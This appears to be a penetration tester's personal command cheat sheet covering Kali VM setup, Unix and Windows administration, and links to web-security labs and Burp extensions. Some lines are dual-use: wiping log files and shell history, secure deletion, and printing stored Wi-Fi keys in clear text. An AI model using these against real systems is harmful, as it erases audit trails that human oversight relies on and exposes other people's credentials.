	$ cp /media/cdrom0/VBoxLinuxAdditions.run ~/Desktop && chmod 755 ~/Desktop/VBoxLinuxAdditions.run && sudo ~/Desktop/VBoxLinuxAdditions.run
	$ sudo reboot
	$ rm ~/Desktop/VBoxLinuxAdditions.run && sudo eject
[ALL] Manage users
	* Enable root or create new user
		SWITCH {
			CASE (root):
				$ sudo -i
				$ passwd root
				* Re-login as root
			CASE (non-root):
				$ sudo useradd -u 1337 snovvcrash
				* Re-login as snovvcrash
		}
	* Disable kali user [VM]
		SWITCH {
			CASE (lock):
				$ sudo usermod -L kali && usermod -s /sbin/nologin kali && chage -E0 kali
			CASE (delete):
				$ sudo userdel -r kali
		}
[ALL] Increase sudo password timeout value
	$ sudo visudo
		"Defaults    env_reset,timestamp_timeout=45"
[ALL] Install cmake
	$ sudo apt install cmake -y
[ALL] Pull dotfiles
	$ git clone https://github.com/snovvcrash/dotfiles-linux ~/.dotfiles
[ALL] Run ~/.dotfiles/00-autodeploy scripts on the discretion
```




## VirtualBox



### Guest Additions

Known issues:

* [forums.virtualbox.org/viewtopic.php?f=3&t=96087](https://forums.virtualbox.org/viewtopic.php?f=3&t=96087)
* [www.ceos3c.com/hacking/kali-linux-2020-1-virtualbox-shared-clipboard-stopped-working-fixed/](https://www.ceos3c.com/hacking/kali-linux-2020-1-virtualbox-shared-clipboard-stopped-working-fixed/)



### Network

Configure multiple interfaces to work simultaneously:

```
root@kali:$ cat /etc/network/interfaces
# This file describes the network interfaces available on your system
# and how to activate them. For more information, see interfaces(5).

source /etc/network/interfaces.d/*

# NAT
allow-hotplug eth0
iface eth0 inet dhcp

# Internal
allow-hotplug eth1
iface eth1 inet dhcp

# Host-only
allow-hotplug eth2
iface eth2 inet dhcp

# The loopback network interface
auto lo
iface lo inet loopback
```

```
root@kali:$ ifup eth0
root@kali:$ ifup eth1
root@kali:$ ifup eth2
```

* [unix.stackexchange.com/questions/37122/virtualbox-two-network-interfaces-nat-and-host-only-ones-in-a-debian-guest-on](https://unix.stackexchange.com/questions/37122/virtualbox-two-network-interfaces-nat-and-host-only-ones-in-a-debian-guest-on)
* [kali.training/topic/configuring-the-network/](https://kali.training/topic/configuring-the-network/)
* [www.blackmoreops.com/2013/11/25/how-to-fix-wired-network-interface-device-not-managed-error/](https://www.blackmoreops.com/2013/11/25/how-to-fix-wired-network-interface-device-not-managed-error/)
* [www.virtualbox.org/manual/ch06.html](https://www.virtualbox.org/manual/ch06.html)
* [forums.kali.org/showthread.php?29657-Only-one-of-multiple-wired-interfaces-(eth0-eth1-etc)-can-be-active-at-a-time](https://forums.kali.org/showthread.php?29657-Only-one-of-multiple-wired-interfaces-(eth0-eth1-etc)-can-be-active-at-a-time)



### Share Folder (old)

Mount:

```
root@kali:$ mkdir ~/Desktop/Share
root@kali:$ mount -t vboxsf /mnt/share-host ~/Desktop/Share
Or (if mounted from VBox settings)
root@kali:$ ln -s /mnt/share-host ~/Desktop/Share

root@kali:$ sudo adduser $USER vboxsf
```

Automount:

```
root@kali:$ crontab -e
"@reboot    sleep 10; mount -t vboxsf /mnt/share-host ~/Desktop/Share"
```





# Unix




## Encodings

From CP1252 to UTF-8:

```
$ iconv -f CP1252 -t UTF8 inputfile.txt -o outputfile.txt
Or
$ enconv -x UTF8 somefile.txt
```

Check:

```
$ enconv -d somefile.txt
Or
$ file -i somefile.txt
```

Remove ANSI escape codes:

```
$ awk '{ gsub("\\x1B\\[[0-?]*[ -/]*[@-~]", ""); print }' somefile.txt
```



### Windows/Unix Text

```
input.txt: ASCII text
VS
input.txt: ASCII text, with CRLF line terminators
```

From Win to Unix:

```
$ awk '{ sub("\r$", ""); print }' input.txt > output.txt
Or
$ dos2unix input.txt
```

From Unix to Win:

```
$ awk 'sub("$", "\r")' input.txt > output.txt
Or
$ unix2dos input.txt
```




## Network



### Connections

```
$ netstat -anlp | grep LIST
$ ss -nlpt | grep LIST
```



### Public IP

```
$ wget -q -O - https://ipinfo.io/ip
```




## Virtual Terminal

```
Start:
CTRL + ALT + F1-6

Stop:
ALT + F8
```




## Process Kill

```
$ ps aux | grep firefox
Or
$ pidof firefox

$ kill -15 <PID>
Or
$ kill -SIGTERM <PID>
Or
$ kill <PID>

If -15 signal didn't help, use stronger -9 signal:
$ kill -9 <PID>
Or
$ kill -SIGKILL <PID>
```




## Dev



### C Library Path

```
$ echo '#include <sys/types.h>'' | gcc -E -x c - | grep '/types.h'
```



### Vangrind

```
$ valgrind --leak-check=full --track-origins=yes --leak-resolution=med ./a.out
```




## OpenSSL



### Encrypt/Decrypt

```
$ openssl enc -e -aes-128-ecb -in file.txt -out file.txt.ecb -K 10101010
$ openssl enc -d -aes-128-ecb -in file.txt.ecb -out file.txt.ecb_dec -K 10101010

$ echo 'secret_data1 + secret_data2 + secret_data3' | openssl enc -e -aes-256-cbc -a -salt -md sha256 -iv 10101010 -pass pass:qwerty
$ echo 'U2FsdGVkX1+d1qH1M3nhYFKscrg5QYt+AlTSBPHgdB4JEP8YSy1FX+xYdrfJ5cZgfoGrW+2On7lMxRIhKCUmWQ==' | openssl enc -d -aes-256-cbc -a -salt -md sha256 -iv 10101010 -pass pass:qwerty
```



### Generate Keys

```
$ ssh-keygen -t rsa -b 4096 -N 's3cr3t_p4ssw0rd' -C 'user@email.com' -f rsa_key
$ mv rsa_key rsa_key.old
$ openssl pkcs8 -topk8 -v2 des3 \
  -in rsa_key.old -passin 'pass:s3cr3t_p4ssw0rd' \
  -out rsa_key -passout 'pass:s3cr3t_p4ssw0rd'
$ chmod 600 rsa_key

$ openssl rsa -text -in rsa_key -passin 'pass:s3cr3t_p4ssw0rd'
$ openssl asn1parse -in rsa_key

$ ssh-keygen -o -a 100 -t ed25519 -f ~/.ssh/id_ed25519
```




## Clear



### Log Files

```
$ > logfile
Or
$ cat /dev/null > logfile
Or
$ dd if=/dev/null of=logfile
Or
$ truncate logfile --size 0
```



### .bash_history

```
$ cat /dev/null > ~/.bash_history && history -c && exit
```




## Secure Delete

```
$ shred -zvu -n7 /path/to/file
$ find /path/to/dir -type f -exec shred -zvu -n7 {} \;
$ shred -zv -n0 /dev/sdc1
```




## Partitions

List devices:

```
$ lsblk
$ sudo fdisk -l
$ df -h
```

Manage partitions:

```
$ sudo fdisk /dev/sd??
```

Format:

```
$ sudo umount /dev/sd??
$ sudo mkfs.<type> -F 32 -I /dev/sd?? -n VOLUME-NAME
type: 'msdos' (=fat32), 'ntfs'
```




## Floppy

```
$ mcopy -i floppy.img 123.txt ::123.txt
$ mdel -i floppy.img 123.TXT
```




## Checksums

Compare file hashes:

```
$ md5sum /path/to/abc.txt | awk '{print $1, "/path/to/cba.txt"}' > /tmp/checksum.txt
$ md5sum -c /tmp/checksum.txt
```

Compare directory hashes:

```
$ hashdeep -c md5 -r /path/to/dir1 > dir1hashes.txt
$ hashdeep -c md5 -r -X -k dir1hashes.txt /path/to/dir2
```




## Permissions

Set defaults for files:

```
$ find . -type f -exec chmod 644 {} \;
```

Set defaults for directories:

```
$ find . -type d -exec chmod 755 {} \;
```




## Fix Linux Freezes while Copying

```
$ sudo crontab -l | { cat; echo '@reboot echo $((16*1024*1024)) > /proc/sys/vm/dirty_background_bytes'; } | crontab -
$ sudo crontab -l | { cat; echo '@reboot echo $((48*1024*1024)) > /proc/sys/vm/dirty_bytes'; } | crontab -
```




## Kernel

Remove old kernels:

```
$ dpkg -l linux-image-\* | grep ^ii
$ kernelver=$(uname -r | sed -r 's/-[a-z]+//')
$ dpkg -l linux-{image,headers}-"[0-9]*" | awk '/ii/{print $2}' | grep -ve $kernelver
$ sudo apt-get purge $(dpkg -l linux-{image,headers}-"[0-9]*" | awk '/ii/{print $2}' | grep -ve "$(uname -r | sed -r 's/-[a-z]+//')")
```




## Xfce4

Install `xfce4`:

```
$ sudo apt update
$ sudo apt upgrade -y
$ sudo apt install xfce4 xfce4-terminal gtk2-engines-pixbuf -y
```




## GIFs

```
$ sudo apt install peek -y
Or
$ sudo apt install byzanz xdotool -y
$ xdotool getmouselocation
$ byzanz-record --duration=15 --x=130 --y=90 --width=800 --height=500 ~/Desktop/out.gif
```




## NTP

```
$ sudo apt purge ntp -y
$ sudo timedatectl set-timezone Europe/Moscow
$ sudo vi /etc/systemd/timesyncd.conf
NTP=0.ru.pool.ntp.org 1.ru.pool.ntp.org 2.ru.pool.ntp.org 3.ru.pool.ntp.org
$ sudo service systemd-timesyncd restart
$ sudo timedatectl set-ntp true
$ timedatectl status
$ service systemd-timesyncd status
$ service systemd-timedated status
```

1. [feeding.cloud.geek.nz/posts/time-synchronization-with-ntp-and-systemd/](https://feeding.cloud.geek.nz/posts/time-synchronization-with-ntp-and-systemd/)
2. [billauer.co.il/blog/2019/01/ntp-systemd/](http://billauer.co.il/blog/2019/01/ntp-systemd/)




## ImageMagick

XOR 2 images:

```
$ convert img1.png img2.png -fx "(((255*u)&(255*(1-v)))|((255*(1-u))&(255*v)))/255" img_out
```




## Tools



### tar


#### .tar

Pack:

```
tar -cvf filename.tar
```

Unpack:

```
tar -xvf filename.tar
```


#### .tar.gz

Pack:

```
tar -cvzf filename.tar.gz
```

Unpack:

```
tar -xvzf filename.tar.gz
```


#### .tar.bz

Pack:

```
tar -cvjf filename.tar.bz
```

Unpack:

```
tar -xvjf filename.tar.bz
```



### 7z

Encrypt and pack all files in directory::

```
$ 7z a packed.7z -mhe -p"p4sSw0rD" *
```

Decrypt and unpack:

```
$ 7z e packed.7z -p"p4sSw0rD"
```



### grep/find/sed

Recursive grep:

```
$ grep -rnw /path/to/dir -e 'pattern'
```

Recursive find and replace:

```
$ find . -type f -name "*.txt" -exec sed -i'' -e 's/\<foo\>/bar/g' {} +
```

Exec `strings` and grep on the result with printing filenames:

```
$ find . -type f -print -exec sh -c 'strings $1 | grep -i -n "signature"' sh {} \;
```

Find and `xargs` grep results:

```
$ find . -type f -print0 | xargs -0 grep <PATTERN>
```



### dpkg

```
$ dpkg -s <package_name>
$ dpkg-query -W -f='${Status}' <package_name>
$ OUT="dpkg-query-$(date +'%FT%H%M%S').csv"; echo 'package,version' > ${OUT} && dpkg-query -W -f '${Package},${Version}\n' >> ${OUT}
```



### iptables

* [An In-Depth Guide to iptables, the Linux Firewall - Boolean World](https://www.booleanworld.com/depth-guide-iptables-linux-firewall/)

List rules in all chains (default table is *filter*, there are *mangle*, *nat* and *raw* tables beside it):

```
$ sudo iptables -L -n --line-numbers [-t filter]
```

Print rules for all chains (for a specific chains):

```
$ sudo iptables -S [INPUT [1]]
```



### fail2ban

```bash
# Filters location which turn into *user-defined* fail2ban iptables rules (automatically)
/etc/fail2ban/filter.d

# Status
$ sudo service fail2ban status
$ sudo fail2ban-client status
$ sudo fail2ban-client status sshd

# Unban all
$ sudo fail2ban-client unban --all
```



### Console Logging


#### script

```
$ script tool-$(date "+%FT%H%M%S").script
```


#### tmux

* [github.com/tmux-plugins/tmux-logging](https://github.com/tmux-plugins/tmux-logging)

```
bash ~/.tmux/plugins/tmux-logging/scripts/screen_capture.sh
bash ~/.tmux/plugins/tmux-logging/scripts/save_complete_history.sh
```


#### Time in Prompt

##### bash

`~/.bashrc` (replace `!` with `%`):

```
PS1='${debian_chroot:!($debian_chroot)}[\D!d}|\D{!k:!M}] \[\033[01;32m\]λ  \[\033[00m\]\[\033[01;34m\]\w\[\033[00m\] '
```

##### zsh

`$ZSH_CUSTOM/themes/robbyrussell.zsh-theme` (replace `!` with `%`):

```
PROMPT="!(?:!{$fg_bold[green]!}➜ :!{$fg_bold[red]!}➜ ) "
PROMPT+='!{$fg[cyan]!}!(4~|!-1~/…/!2~|!3~)!{$reset_color!} $(git_prompt_info)'

if lsof -tac script "$(tty)" > /dev/null; then
    PROMPT="[!D{!d}|!D{!k:!M}]* $PROMPT"
else
    PROMPT="[!D{!d}|!D{!k:!M}] $PROMPT"
fi
```




## Fun



### CMatrix

```
$ sudo apt-get install cmatrix
```



### screenfetch

```
$ wget -O screenfetch https://raw.github.com/KittyKatt/screenFetch/master/screenfetch-dev
$ chmod +x screenfetch
$ sudo mv screenfetch /usr/bin
```





# Windows




## Secure Delete



### cipher

```
Cmd > cipher /w:H
```



### sdelete

File:

```
Cmd > sdelete -p 7 testfile.txt
```

Directory (recursively):

```
Cmd > sdelete -p 7 -r "C:\temp"
```

Disk or partition:

```
Cmd > sdelete -p 7 -c H:
```




## System Perfomance

```
Cmd > perfmon /res
```




## Network



### Connections and Routes

```
Cmd > netstat -b
Cmd > netstat -ano
Cmd > route print [-4]
```



### Clean Cache

```
Cmd > netsh int ip reset
Cmd > netsh int tcp reset
Cmd > ipconfig /flushdns
Cmd > netsh winsock reset
Cmd > route -f
[Cmd> ipconfig -renew]
```

Hide/unhide computer name on LAN:

```
Cmd > net config server
Cmd > net config server /hidden:yes
Cmd > net config server /hidden:no
(+ reboot)
```




## Symlinks

```
Cmd > mklink Link <FILE>
Cmd > mklink /D Link <DIRECTORY>
```




## Wi-Fi Credentials

* [https://www.nirsoft.net/utils/wireless_key.html#DownloadLinks](https://www.nirsoft.net/utils/wireless_key.html#DownloadLinks)

```
> netsh wlan show profiles
> netsh wlan show profiles "ESSID" key=clear
```




## Installed Software

```
PS > Get-ItemProperty HKLM:\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\* | Select-Object DisplayName, DisplayVersion, Publisher, InstallDate | Format-Table –AutoSize > InstalledSoftware.txt
```




## ADS

```
PS > Get-Item 'file.txt' -Stream *
PS > Get-Content 'file.txt' -Stream Password
Or
PS > type 'file.txt:Password'
```




## .msc

```
secpol.msc  -- "Local Security Policy" -- «Локальная политика безопасности»
gpedit.msc  -- "Local Group Policy Editor" -- «Редактор локальной групповой политики»
lusrmgr.msc -- "Local Users and Groups (Local)" -- «Локальные пользователи и группы (локально)»
certmgr.msc -- "Certificates - Current User" -- «Сертификаты - текущий пользователь»
```




## KRShowKeyMgr

Run:

```
rundll32.exe keymgr.dll, KRShowKeyMgr
```




## Permissions

Take own of a directory and remove it (run cmd.exe as admin):

```
Cmd > takeown /F C:\$Windows.~BT\* /R /A 
Cmd > icacls C:\$Windows.~BT\*.* /T /grant administrators:F 
Cmd > rmdir /S /Q C:\$Windows.~BT\
```





# Useful Links




## Web Security Academy

* [All learning materials - detailed / Web Security Academy](https://portswigger.net/web-security/all-materials/detailed)
* [All labs / Web Security Academy](https://portswigger.net/web-security/all-labs)
* [SQL injection cheat sheet / Web Security Academy](https://portswigger.net/web-security/sql-injection/cheat-sheet)
* [Cross-Site Scripting (XSS) Cheat Sheet / Web Security Academy](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet)




## Upgrade Burp

* [Downloads | Jython](https://www.jython.org/download.html)
* [Прокачай свой Burp! 11 наиболее полезных плагинов к Burp Suite — «Хакер»](https://xakep.ru/2018/08/23/burp-suite-plugins/)

### Extensions

BApp Store:

* [ActiveScan++](https://github.com/portswigger/active-scan-plus-plus) **Pro**
* [Add Custom Header](https://github.com/portswigger/add-custom-header)
* [Additional CSRF Checks](https://github.com/portswigger/additional-csrf-checks)
* [Additional Scanner Checks](https://github.com/portswigger/additional-scanner-checks) **Pro**
* [Attack Surface Detector](https://github.com/portswigger/attack-surface-detector)
* [Backslash Powered Scanner](https://github.com/portswigger/backslash-powered-scanner) **Pro**
* [Collaborator Everywhere](https://github.com/portswigger/collaborator-everywhere) **Pro**
* [CSRF Scanner](https://github.com/portswigger/csrf-scanner) **Pro**
* [Freddy, Deserialization Bug Finder](https://github.com/portswigger/freddy-deserialization-bug-finder) **Pro**
* [IP Rotate](https://github.com/portswigger/ip-rotate)
* [J2EEScan](https://github.com/portswigger/j2ee-scan) **Pro**
* [Java Deserialization Scanner](https://github.com/portswigger/java-deserialization-scanner) **Pro**
* [Java Serialized Payloads](https://github.com/portswigger/java-serialized-payloads)
* [JS Link Finder](https://github.com/portswigger/js-link-finder) **Pro**
* [JSON Beautifier](https://github.com/portswigger/json-beautifier)
* [JSON Web Token Attacker](https://github.com/portswigger/json-web-token-attacker)
* [Logger++](https://github.com/portswigger/logger-plus-plus)
* [SQLiPy Sqlmap Integration](https://github.com/portswigger/sqli-py)
* [SSL Scanner](https://github.com/portswigger/ssl-scanner)
* [Taborator](https://github.com/portswigger/taborator) **Pro**
* [WordPress Scanner](https://github.com/portswigger/wordpress-scanner)

GitHub:

* [Femida XSS](https://github.com/wish-i-was/femida)
* [SHELLING](https://github.com/ewilded/shelling)

